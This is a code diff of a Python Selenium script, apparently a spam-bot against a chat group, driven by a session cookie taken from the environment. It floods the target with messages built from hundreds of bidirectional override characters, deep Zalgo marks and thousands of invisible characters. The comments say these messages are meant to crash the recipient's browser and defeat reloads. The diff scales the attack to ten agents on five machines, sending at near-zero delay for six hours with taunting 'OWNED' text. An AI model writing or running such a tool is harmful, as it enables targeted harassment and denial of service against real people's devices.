@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (RELOAD BREAKER)
-# 📅 STATUS: INIT-CRASH MODE | 2 THREADS | HYPER-SPEED
+# 🚀 PROJECT: PRAVEER NC (10-AGENT BLITZ)
+# 📅 STATUS: 5 MACHINES | RELOAD BREAKER | PRAVEER PAPA EDITION
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -9,33 +9,33 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
 
-# --- RELOAD BREAKER CONFIG ---
-THREADS = 2             
+# --- GLOBAL CONFIG ---
+THREADS = 2  # 2 threads per machine x 5 machines = 10 AGENTS
 TOTAL_DURATION = 21600  
-BURST_SPEED = (0.01, 0.04) # Near-zero delay
-SESSION_LIMIT = 50 # Reloading our own browser faster to stay ahead
+BURST_SPEED = (0.01, 0.03) 
+SESSION_LIMIT = 45 # Faster reloads to stay ahead of target's "Reload Tab" defense
+
+GLOBAL_SENT = 0
+COUNTER_LOCK = threading.Lock()
+MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
 def get_reload_breaker_payload(target):
-    """Generates a payload designed to crash the browser during initial load."""
-    # Recursive Directional Overrides (The 'Layout Killer')
-    # This flips the browser's rendering direction back and forth instantly
-    direction_chaos = ("\u202E" + "\u202D") * 50 
+    header = "👑 PRAVEER PAPA 👑\n"
+    sub_header = f"SYSTEM ERROR: {target.upper()} HAS BEEN OWNED\n"
     
-    # Mathematical Bold Script (High-cost vectors)
-    praveer_text = "𝐏𝐑𝐀𝐕𝐄𝐄𝐑_𝐍𝐂_𝐎𝐖𝐍𝐙_𝐘𝐎𝐔"
+    # 200 Directional Overrides (The Layout Killer)
+    direction_chaos = ("\u202E" + "\u202D") * 100 
     
-    # Mega-Zalgo (60 marks high)
-    z_tower = "̸" * 60
+    # Massive Zalgo Towers (80 marks deep)
+    z_tower = "̸" * 80
     
-    # 5,000 character invisible 'buffer' to bloat the initial JSON response
-    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(5000))
+    # 3500+ Character Invisible Buffer
+    bloat = "".join(random.choice(["\u200B", "\u200D", "\u2060"]) for _ in range(3500))
     
-    lines = []
-    lines.append(f"☢️ RELOAD FAILED: {target.upper()} ☢️")
-    lines.append(bloat)
-    for _ in range(25): # Massive Vertical Wall
-        lines.append(direction_chaos + praveer_text + z_tower)
-    lines.append(bloat)
+    lines = [header, sub_header, bloat]
+    for _ in range(35):
+        lines.append(direction_chaos + "PRAVEER_OWNZ_YOU" + z_tower)
+    lines.append(bloat + "\n🛑 PAGE UNRESPONSIVE 🛑")
     
     return "\n".join(lines)
 
@@ -45,11 +45,9 @@ def get_driver(agent_id):
     chrome_options.add_argument("--no-sandbox") 
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
-    # Forces the browser to ignore cache, making every reload of theirs slower
-    chrome_options.add_argument("--disk-cache-size=1")
-    chrome_options.add_argument("--media-cache-size=1")
     
-    temp_dir = os.path.join(tempfile.gettempdir(), f"breaker_{agent_id}_{int(time.time())}")
+    # Unique Temp Directory per Agent to prevent file locking
+    temp_dir = os.path.join(tempfile.gettempdir(), f"m{MACHINE_ID}_a{agent_id}_{int(time.time())}")
     chrome_options.add_argument(f"--user-data-dir={temp_dir}")
     return webdriver.Chrome(options=chrome_options)
 
@@ -83,7 +81,10 @@ def run_life_cycle(agent_id, cookie, target):
             while (time.time() - session_start) < SESSION_LIMIT:
                 payload = get_reload_breaker_payload(os.getenv("TARGET_NAME", "Target"))
                 if adaptive_inject(driver, payload):
-                    print(f"[!] BREAK-SENT | MODE: RELOAD_KILLER", flush=True)
+                    with COUNTER_LOCK:
+                        global GLOBAL_SENT
+                        GLOBAL_SENT += 1
+                        print(f"[M{MACHINE_ID}-A{agent_id}] SENT | TOTAL: {GLOBAL_SENT} | PAPA POWER 👑", flush=True)
                 time.sleep(random.uniform(*BURST_SPEED))
         except: pass 
         finally:
@@ -95,8 +96,10 @@ def main():
     cookie = os.environ.get("SESSION_ID", "").strip()
     raw_url = os.environ.get("GROUP_URL", "").strip()
     target_id = raw_url.split('/')[-2] if '/' in raw_url else raw_url
+    
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
-        for i in range(THREADS): executor.submit(run_life_cycle, i+1, cookie, target_id)
+        for i in range(THREADS):
+            executor.submit(run_life_cycle, i+1, cookie, target_id)
 
 if __name__ == "__main__":
     main()
